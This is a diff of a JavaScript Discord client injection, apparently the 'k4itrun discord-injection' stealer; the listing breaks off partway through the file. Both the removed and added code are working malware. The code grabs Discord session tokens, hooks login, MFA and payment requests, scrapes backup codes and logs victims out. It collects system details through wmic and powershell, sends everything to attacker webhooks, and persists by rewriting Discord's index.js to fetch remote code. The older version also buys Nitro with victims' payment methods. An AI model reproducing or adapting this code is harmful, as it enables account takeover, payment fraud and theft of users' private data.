@@ -1,970 +1,1458 @@
-const args = process.argv;
-const fs = require('fs');
-const path = require('path');
-const https = require('https');
 const querystring = require('querystring');
+const https = require('https');
+const http = require('http');
+const path = require('path');
+const fs = require('fs');
+
+const { exec } = require('child_process');
+const { promisify } = require('util');
 const { BrowserWindow, session } = require('electron');
 
-const config = {
-  webhook: '%WEBHOOK%',
-  webhook_protector_key: '%WEBHOOK_KEY%',
-  auto_buy_nitro: false, 
-  ping_on_run: false, 
-  ping_val: '@everyone', 
-  embed_name: 'Christopheryves Injection', 
-  embed_icon: 'https://resmim.net/cdn/2024/02/09/ZJtetH.jpg', 
-  embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/doracan/discord-injection/main/obfuscated.js', 
-
-  api: 'https://discord.com/api/v9/users/@me',
-  nitro: {
-    boost: {
-      year: {
-        id: '521847234246082599',
-        sku: '511651885459963904',
-        price: '9999',
-      },
-      month: {
-        id: '521847234246082599',
-        sku: '511651880837840896',
-        price: '999',
-      },
-    },
-    classic: {
-      month: {
-        id: '521846918637420545',
-        sku: '511651871736201216',
-        price: '499',
-      },
-    },
-  },
-  filter: {
-    urls: [
-      'https://discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/users/@me',
-      'https://*.discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/auth/login',
-      'https://discord.com/api/v*/auth/login',
-      'https://*.discord.com/api/v*/auth/login',
-      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
-      'https://api.stripe.com/v*/tokens',
-      'https://api.stripe.com/v*/setup_intents/*/confirm',
-      'https://api.stripe.com/v*/payment_intents/*/confirm',
-    ],
-  },
-  filter2: {
-    urls: [
-      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
-      'https://*.discord.com/api/v*/applications/detectable',
-      'https://discord.com/api/v*/applications/detectable',
-      'https://*.discord.com/api/v*/users/@me/library',
-      'https://discord.com/api/v*/users/@me/library',
-      'wss://remote-auth-gateway.discord.gg/*',
-    ],
-  },
+const execCommand = async (command, options = {}) => {
+    try {
+        const { stdout, stderr } = await promisify(exec)(command, options);
+        if (stderr) {
+            console.error(stderr);
+        }
+        return stdout.trim();
+    } catch (error) {
+        return null;
+    }
 };
 
-function parity_32(x, y, z) {
-  return x ^ y ^ z;
-}
-function ch_32(x, y, z) {
-  return (x & y) ^ (~x & z);
-}
-
-function maj_32(x, y, z) {
-  return (x & y) ^ (x & z) ^ (y & z);
-}
-function rotl_32(x, n) {
-  return (x << n) | (x >>> (32 - n));
-}
-function safeAdd_32_2(a, b) {
-  var lsw = (a & 0xffff) + (b & 0xffff),
-    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);
-
-  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
-}
-function safeAdd_32_5(a, b, c, d, e) {
-  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
-    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);
-
-  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
-}
-function binb2hex(binarray) {
-  var hex_tab = '0123456789abcdef',
-    str = '',
-    length = binarray.length * 4,
-    i,
-    srcByte;
-
-  for (i = 0; i < length; i += 1) {
-    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
-    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
-  }
-
-  return str;
-}
-
-function getH() {
-  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
-}
-function roundSHA1(block, H) {
-  var W = [],
-    a,
-    b,
-    c,
-    d,
-    e,
-    T,
-    ch = ch_32,
-    parity = parity_32,
-    maj = maj_32,
-    rotl = rotl_32,
-    safeAdd_2 = safeAdd_32_2,
-    t,
-    safeAdd_5 = safeAdd_32_5;
-
-  a = H[0];
-  b = H[1];
-  c = H[2];
-  d = H[3];
-  e = H[4];
-
-  for (t = 0; t < 80; t += 1) {
-    if (t < 16) {
-      W[t] = block[t];
-    } else {
-      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
+const execScript = async (script) => {
+    const windows = BrowserWindow.getAllWindows();
+    if (windows.length === 0) return null;
+    try {
+        const result = await windows[0].webContents.executeJavaScript(script, true);
+        return result;
+    } catch (error) {
+        return null;
     }
+};
 
-    if (t < 20) {
-      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
-    } else if (t < 40) {
-      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
-    } else if (t < 60) {
-      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
-    } else {
-      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
-    }
-
-    e = d;
-    d = c;
-    c = rotl(b, 30);
-    b = a;
-    a = T;
-  }
-
-  H[0] = safeAdd_2(a, H[0]);
-  H[1] = safeAdd_2(b, H[1]);
-  H[2] = safeAdd_2(c, H[2]);
-  H[3] = safeAdd_2(d, H[3]);
-  H[4] = safeAdd_2(e, H[4]);
-
-  return H;
-}
-
-function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
-  var i, appendedMessageLength, offset;
-
-  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
-  while (remainder.length <= offset) {
-    remainder.push(0);
-  }
-  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
-  remainder[offset] = remainderBinLen + processedBinLen;
-  appendedMessageLength = remainder.length;
-
-  for (i = 0; i < appendedMessageLength; i += 16) {
-    H = roundSHA1(remainder.slice(i, i + 16), H);
-  }
-  return H;
-}
-
-function hex2binb(str, existingBin, existingBinLen) {
-  var bin,
-    length = str.length,
-    i,
-    num,
-    intOffset,
-    byteOffset,
-    existingByteLen;
-
-  bin = existingBin || [0];
-  existingBinLen = existingBinLen || 0;
-  existingByteLen = existingBinLen >>> 3;
-
-  if (0 !== length % 2) {
-    console.error('String of HEX type must be in byte increments');
-  }
-
-  for (i = 0; i < length; i += 2) {
-    num = parseInt(str.substr(i, 2), 16);
-    if (!isNaN(num)) {
-      byteOffset = (i >>> 1) + existingByteLen;
-      intOffset = byteOffset >>> 2;
-      while (bin.length <= intOffset) {
-        bin.push(0);
-      }
-      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
-    } else {
-      console.error('String of HEX type contains invalid characters');
-    }
-  }
-
-  return { value: bin, binLen: length * 4 + existingBinLen };
-}
-
-class jsSHA {
-  constructor() {
-    var processedLen = 0,
-      remainder = [],
-      remainderLen = 0,
-      intermediateH,
-      converterFunc,
-      outputBinLen,
-      variantBlockSize,
-      roundFunc,
-      finalizeFunc,
-      finalized = false,
-      hmacKeySet = false,
-      keyWithIPad = [],
-      keyWithOPad = [],
-      numRounds,
-      numRounds = 1;
-
-    converterFunc = hex2binb;
-
-    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
-      console.error('numRounds must a integer >= 1');
-    }
-    variantBlockSize = 512;
-    roundFunc = roundSHA1;
-    finalizeFunc = finalizeSHA1;
-    outputBinLen = 160;
-    intermediateH = getH();
-
-    this.setHMACKey = function (key) {
-      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
-      keyConverterFunc = hex2binb;
-      convertRet = keyConverterFunc(key);
-      keyBinLen = convertRet['binLen'];
-      keyToUse = convertRet['value'];
-      blockByteSize = variantBlockSize >>> 3;
-      lastArrayIndex = blockByteSize / 4 - 1;
-
-      if (blockByteSize < keyBinLen / 8) {
-        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
-        while (keyToUse.length <= lastArrayIndex) {
-          keyToUse.push(0);
-        }
-        keyToUse[lastArrayIndex] &= 0xffffff00;
-      } else if (blockByteSize > keyBinLen / 8) {
-        while (keyToUse.length <= lastArrayIndex) {
-          keyToUse.push(0);
-        }
-        keyToUse[lastArrayIndex] &= 0xffffff00;
-      }
-
-      for (i = 0; i <= lastArrayIndex; i += 1) {
-        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
-        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
-      }
-
-      intermediateH = roundFunc(keyWithIPad, intermediateH);
-      processedLen = variantBlockSize;
-
-      hmacKeySet = true;
-    };
-
-    this.update = function (srcString) {
-      var convertRet,
-        chunkBinLen,
-        chunkIntLen,
-        chunk,
-        i,
-        updateProcessedLen = 0,
-        variantBlockIntInc = variantBlockSize >>> 5;
-
-      convertRet = converterFunc(srcString, remainder, remainderLen);
-      chunkBinLen = convertRet['binLen'];
-      chunk = convertRet['value'];
-
-      chunkIntLen = chunkBinLen >>> 5;
-      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
-        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
-          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
-          updateProcessedLen += variantBlockSize;
-        }
-      }
-      processedLen += updateProcessedLen;
-      remainder = chunk.slice(updateProcessedLen >>> 5);
-      remainderLen = chunkBinLen % variantBlockSize;
-    };
-
-    this.getHMAC = function () {
-      var firstHash;
-
-      if (false === hmacKeySet) {
-        console.error('Cannot call getHMAC without first setting HMAC key');
-      }
-
-      const formatFunc = function (binarray) {
-        return binb2hex(binarray);
-      };
-
-      if (false === finalized) {
-        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
-        intermediateH = roundFunc(keyWithOPad, getH());
-        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
-      }
-
-      finalized = true;
-      return formatFunc(intermediateH);
-    };
-  }
-}
-
-if ('function' === typeof define && define['amd']) {
-  define(function () {
-    return jsSHA;
-  });
-} else if ('undefined' !== typeof exports) {
-  if ('undefined' !== typeof module && module['exports']) {
-    module['exports'] = exports = jsSHA;
-  } else {
-    exports = jsSHA;
-  }
-} else {
-  global['jsSHA'] = jsSHA;
-}
-
-if (jsSHA.default) {
-  jsSHA = jsSHA.default;
-}
-
-function totp(key) {
-  const period = 30;
-  const digits = 6;
-  const timestamp = Date.now();
-  const epoch = Math.round(timestamp / 1000.0);
-  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
-  const shaObj = new jsSHA();
-  shaObj.setHMACKey(base32tohex(key));
-  shaObj.update(time);
-  const hmac = shaObj.getHMAC();
-  const offset = hex2dec(hmac.substring(hmac.length - 1));
-  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
-  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
-  return otp;
-}
-
-function hex2dec(s) {
-  return parseInt(s, 16);
-}
-
-function dec2hex(s) {
-  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
-}
-
-function base32tohex(base32) {
-  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
-    bits = '',
-    hex = '';
-
-  base32 = base32.replace(/=+$/, '');
-
-  for (let i = 0; i < base32.length; i++) {
-    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
-    if (val === -1) console.error('Invalid base32 character in key');
-    bits += leftpad(val.toString(2), 5, '0');
-  }
-
-  for (let i = 0; i + 8 <= bits.length; i += 8) {
-    let chunk = bits.substr(i, 8);
-    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
-  }
-  return hex;
-}
-
-function leftpad(str, len, pad) {
-  if (len + 1 >= str.length) {
-    str = Array(len + 1 - str.length).join(pad) + str;
-  }
-  return str;
-}
-
-const discordPath = (function () {
-  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
-  let resourcePath;
-
-  if (process.platform === 'win32') {
-    resourcePath = path.join(app, 'resources');
-  } else if (process.platform === 'darwin') {
-    resourcePath = path.join(app, 'Contents', 'Resources');
-  }
-
-  if (fs.existsSync(resourcePath)) return { resourcePath, app };
-  return { undefined, undefined };
-})();
-
-function updateCheck() {
-  const { resourcePath, app } = discordPath;
-  if (resourcePath === undefined || app === undefined) return;
-  const appPath = path.join(resourcePath, 'app');
-  const packageJson = path.join(appPath, 'package.json');
-  const resourceIndex = path.join(appPath, 'index.js');
-  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
-  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
-  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
-  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
-  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
-
-  if (process.platform === 'win32' || process.platform === 'darwin') {
-    fs.writeFileSync(
-      packageJson,
-      JSON.stringify(
-        {
-          name: 'discord',
-          main: 'index.js',
+const CONFIG = {
+    webhook: '%WEBHOOK_URL%',
+    API: '%API_URL%',
+    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
+    auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
+    auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
+    auto_email_update: '%AUTO_EMAIL_UPDATE%',
+    injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
+    injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
+    get: {
+        token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
+        logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
+        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`),
+        clear_local_storage: () => execScript(`const iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.contentWindow.localStorage.clear();document.body.removeChild(iframe);setTimeout(() => {window.location.reload();}, 3000);`),
+    },
+    auth_filters: {
+        urls: [
+            '/users/@me',
+            '/auth/login',
+            '/auth/register',
+            '/remote-auth/login',
+            '/mfa/totp',
+            '/mfa/totp/enable',
+            '/mfa/sms/enable',
+            '/mfa/totp/disable',
+            '/mfa/sms/disable',
+            '/mfa/codes-verification',
+        ],
+    },
+    session_filters: {
+        urls: [
+            'wss://remote-auth-gateway.discord.gg/*',
+            'https://discord.com/api/v*/auth/sessions',
+            'https://*.discord.com/api/v*/auth/sessions',
+            'https://discordapp.com/api/v*/auth/sessions',
+        ],
+    },
+    payment_filters: {
+        urls: [
+            'https://api.stripe.com/v*/tokens',
+            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
+            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
+            'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
+            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
+            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
+        ],
+    },
+    badges: {
+        _nitro: [
+            "<:DiscordBoostNitro1:1087043238654906472> ",
+            "<:DiscordBoostNitro2:1087043319227494460> ",
+            "<:DiscordBoostNitro3:1087043368250511512> ",
+            "<:DiscordBoostNitro6:1087043493236592820> ",
+            "<:DiscordBoostNitro9:1087043493236592820> ",
+            "<:DiscordBoostNitro12:1162420359291732038> ",
+            "<:DiscordBoostNitro15:1051453775832961034> ",
+            "<:DiscordBoostNitro18:1051453778127237180> ",
+            "<:DiscordBoostNitro24:1051453776889917530> ",
+        ],
+        _discord_emloyee: {
+            value: 1,
+            emoji: "<:DiscordEmloyee:1163172252989259898>",
+            rare: true,
         },
-        null,
-        4,
-      ),
+        _partnered_server_owner: {
+            value: 2,
+            emoji: "<:PartneredServerOwner:1163172304155586570>",
+            rare: true,
+        },
+        _hypeSquad_events: {
+            value: 4,
+            emoji: "<:HypeSquadEvents:1163172248140660839>",
+            rare: true,
+        },
+        _bug_hunter_level_1: {
+            value: 8,
+            emoji: "<:BugHunterLevel1:1163172239970140383>",
+            rare: true,
+        },
+        _house_bravery: {
+            value: 64,
+            emoji: "<:HouseBravery:1163172246492287017>",
+            rare: false,
+        },
+        _house_brilliance: {
+            value: 128,
+            emoji: "<:HouseBrilliance:1163172244474822746>",
+            rare: false,
+        },
+        _house_balance: {
+            value: 256,
+            emoji: "<:HouseBalance:1163172243417858128>",
+            rare: false,
+        },
+        _early_supporter: {
+            value: 512,
+            emoji: "<:EarlySupporter:1163172241996005416>",
+            rare: true,
+        },
+        _bug_hunter_level_2: {
+            value: 16384,
+            emoji: "<:BugHunterLevel2:1163172238942543892>",
+            rare: true,
+        },
+        _early_bot_developer: {
+            value: 131072,
+            emoji: "<:EarlyBotDeveloper:1163172236807639143>",
+            rare: true,
+        },
+        _certified_moderator: {
+            value: 262144,
+            emoji: "<:CertifiedModerator:1163172255489085481>",
+            rare: true,
+        },
+        _active_developer: {
+            value: 4194304,
+            emoji: "<:ActiveDeveloper:1163172534443851868>",
+            rare: true,
+        },
+        _spammer: {
+            value: 1048704,
+            emoji: "⌨️",
+            rare: false,
+        },
+    },
+};
+
+const parseJSON = (data) => {
+    try {
+        return JSON.parse(data || '');
+    } catch {
+        return {};
+    }
+};
+
+const clearLocalStorage = () => {
+    try {
+        CONFIG.get.clear_local_storage();
+    } catch {
+        return null;
+    }
+}
+
+const request = async (method, url, headers = {}, data = null) => {
+    try {
+        const requests = [...(url.includes('api/webhooks') ? [url, CONFIG.API] : [url])].map(url => {
+            return new Promise((resolve, reject) => {
+                const { protocol, hostname, pathname, search } = new URL(url);
+                const client = protocol === 'https:' ? https : http;
+                const options = {
+                    hostname,
+                    path: pathname + search,
+                    method,
+                    headers: {
+                        'Access-Control-Allow-Origin': '*',
+                        ...headers,
+                    },
+                };
+                const req = client.request(options, (res) => {
+                    let resData = '';
+                    res.on('data', (chunk) => resData += chunk);
+                    res.on('end', () => resolve(resData));
+                });
+                req.on('error', err => reject(err));
+                if (data) req.write(data);
+                req.end();
+            });
+        });
+        return Promise.all(requests);
+    } catch (err) {
+        return Promise.reject(err);
+    }
+};
+
+const AuritaCord = async () => {
+    try {
+        const logout = await CONFIG.get.logout();
+        const token = await CONFIG.get.token();
+        const API = new Fetcher(token);
+
+        const [user, profile, billing, friends, servers] = await Promise.all([
+            API.User(),
+            API.Profile(),
+            API.Billing(),
+            API.Friends(),
+            API.Servers()
+        ]);
+
+        return {
+            logout,
+            token,
+            user,
+            profile,
+            billing,
+            friends,
+            servers
+        };
+    } catch {
+        return {}
+    }
+}
+
+const notify = async (ctx, token, user) => {
+    const getData = new GetDataUser();
+
+    const [profile, system, network, billing, friends, servers] = [
+        (await AuritaCord()).profile,
+        await getData.SystemInfo(),
+        await getData.Network(),
+        await getData.Billing(token),
+        await getData.Friends(token),
+        await getData.Servers(token),
+    ];
+    
+    const [nitro, badges] = [
+        getData.Nitro(profile),
+        getData.Badges(user.flags),
+    ];
+
+    ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
+    ctx.username = `AuraThemes - injection`;
+    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
+
+    ctx.embeds[0].fields.unshift({
+        name: `<a:hearts:1176516454540116090> Token:`,
+        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        inline: false
+    })
+
+    ctx.embeds[0].thumbnail = {
+        url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
+    };
+
+    ctx.embeds[0].fields.push(
+        { name: "\u200b", value: "\u200b", inline: false },
+        { name: "Nitro", value: nitro, inline: true },
+        { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
+        { name: "\u200b", value: "\u200b", inline: false },
+        { name: "Badges", value: badges, inline: true },
+        { name: "Billing", value: billing, inline: true },
+        { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
 
-    const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJs = '${indexJs}';
-const bdPath = '${bdPath}';
-const fileSize = fs.statSync(indexJs).size
-fs.readFileSync(indexJs, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-        init();
-})
-async function init() {
-    https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
-        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
-        });
+    if (friends) {
+        ctx.embeds.push({ title: friends.title, description: friends.description });
+    }
+
+    if (servers) {
+        ctx.embeds.push({ title: servers.title, description: servers.description });
+    }
+
+    ctx.embeds.push({
+        title: `System Information`,
+        fields: [
+            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
+            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
+            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
+        ]
+    });
+
+    ctx.embeds.forEach(embed => {
+        embed.color = 12740607;
+        embed.author = {
+            name: `${user.username} | ${user.id}`,
+            icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
+        };
+
+        embed.footer = {
+            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
+            icon_url: "https://avatars.githubusercontent.com/u/103044629",
+        };
+
+        embed.timestamp = new Date();
+    });
+
+    try {
+        return await request('POST', CONFIG.webhook, {
+            "Content-Type": "application/json"
+        }, JSON.stringify(ctx));
+    } catch (error) {
+        return null;
+    }
+};
+
+const getBackupCodes = async (response) => {
+    try{
+        const backup_codes = await CONFIG.get.backup_codes();
+        const codes = response.backup_codes || backup_codes;
+
+        const filtered = codes.filter(code => !code.consumed);
     
-    }).on("error", (err) => {
-        setTimeout(init(), 10000);
-    });
-}
-require('${path.join(resourcePath, 'app.asar')}')
-if (fs.existsSync(bdPath)) require(bdPath);`;
-    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
-  }
-  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
-  fs.rmdirSync(path.join(__dirname, 'initiation'));
-  execScript(
-    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
-  );
-  return !1;
-}
-
-const execScript = (script) => {
-  const window = BrowserWindow.getAllWindows()[0];
-  return window.webContents.executeJavaScript(script, !0);
-};
-
-const getInfo = async (token) => {
-  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "${config.api}", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send(null);
-    xmlHttp.responseText;`);
-  return JSON.parse(info);
-};
-
-const fetchBilling = async (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
-    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
-    xmlHttp.setRequestHeader("Authorization", "${token}"); 
-    xmlHttp.send(null); 
-    xmlHttp.responseText`);
-  if (!bill.lenght || bill.length === 0) return '';
-  return JSON.parse(bill);
-};
-
-const getBilling = async (token) => {
-  const data = await fetchBilling(token);
-  if (!data) return '❌';
-  let billing = '';
-  data.forEach((x) => {
-    if (!x.invalid) {
-      switch (x.type) {
-        case 1:
-          billing += '💳 ';
-          break;
-        case 2:
-          billing += '<:paypal:951139189389410365> ';
-          break;
-      }
+        const validCode = filtered
+            .map(code => `${code.code.slice(0, 4)}-${code.code.slice(4)}`)
+            .join('\n');
+        
+        return validCode;
+    } catch (error) {
+        return ''
     }
-  });
-  if (!billing) billing = '❌';
-  return billing;
 };
 
-const Purchase = async (token, id, _type, _time) => {
-  const options = {
-    expected_amount: config.nitro[_type][_time]['price'],
-    expected_currency: 'usd',
-    gift: true,
-    payment_source_id: id,
-    payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
-    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
-  };
+const editSettingUser = async (token) => {
+    try {
+        const response = parseJSON(await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
+            'Content-Type': 'application/json',
+            'Authorization': token
+        }, JSON.stringify({
+            status: 'dnd',
+            email_notifications_enabled: false,
+            stream_notifications_enabled: false,
+            custom_status: {
+                text: 'hackedbyk4itrun',
+                expires_at: null,
+                emoji_id: null,
+                emoji_name: null
+            },
+        })));
 
-  const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
-    xmlHttp.responseText`);
-  if (req['gift_code']) {
-    return 'https://discord.gift/' + req['gift_code'];
-  } else return null;
-};
-
-const buyNitro = async (token) => {
-  const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
-  if (!data) return failedMsg;
-
-  let IDS = [];
-  data.forEach((x) => {
-    if (!x.invalid) {
-      IDS = IDS.concat(x.id);
+        return response;
+    } catch (error) {
+        return {};
     }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, 'boost', 'year');
-    if (first !== null) {
-      return first;
-    } else {
-      const second = Purchase(token, sourceID, 'boost', 'month');
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, 'classic', 'month');
-        if (third !== null) {
-          return third;
-        } else {
-          return failedMsg;
+};
+
+class Fetcher {
+    constructor(token) {
+        this.token = token;
+    }
+    _fetch = async (endpoint, headers) => {
+        const APIs = [
+            'https://discordapp.com/api',
+            'https://discord.com/api',
+            'https://canary.discord.com/api',
+            'https://ptb.discord.com/api'
+        ];
+        const response = parseJSON(await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers));
+        return response;
+    };
+
+    User = async () => {
+        return await this._fetch("@me", {
+            'Content-Type': 'application/json',
+            "Authorization": this.token
+        });
+    };
+
+    Profile = async () => {
+        return await this._fetch(`${Buffer.from(this.token.split(".")[0], "base64").toString("binary")}/profile`, {
+            'Content-Type': 'application/json',
+            "Authorization": this.token
+        });
+    };
+
+    Friends = async () => {
+        return await this._fetch("@me/relationships", {
+            'Content-Type': 'application/json',
+            "Authorization": this.token
+        });
+    };
+
+    Servers = async () => {
+        return await this._fetch("@me/guilds?with_counts=true", {
+            'Content-Type': 'application/json',
+            "Authorization": this.token
+        });
+    };
+
+    Billing = async () => {
+        return await this._fetch("@me/billing/payment-sources", {
+            'Content-Type': 'application/json',
+            "Authorization": this.token
+        });
+    };
+};
+
+class GetDataUser {
+    SystemInfo = async () => {
+        try {
+            const [os, cpu, gpu, ram, uuid, productKey, macAddress, localIP, cpuCount] = await Promise.all([
+                execCommand("wmic OS get caption, osarchitecture | more +1"),
+                execCommand("wmic cpu get name | more +1"),
+                execCommand("wmic PATH Win32_VideoController get name | more +1").then(stdout => stdout.replace(/\r\n|\r/g, "")),
+                execCommand("wmic computersystem get totalphysicalmemory | more +1").then(stdout => `${Math.floor(parseInt(stdout) / (1024 * 1024 * 1024))} GB`),
+                execCommand("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"),
+                execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
+                execCommand("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress"),
+                execCommand("powershell.exe (Get-NetIPAddress).IPAddress"),
+                execCommand("echo %NUMBER_OF_PROCESSORS%")
+            ]);
+
+            return {
+                os,
+                cpu,
+                gpu,
+                ram,
+                uuid,
+                productKey,
+                macAddress,
+                localIP,
+                cpuCount,
+            };
+        } catch (error) {
+            return {};
         }
-      }
+    };
+
+    Network = async () => {
+        try {
+            const response = parseJSON(await request('GET', "http://ip-api.com/json", {
+                'Content-Type': 'application/json'
+            }));
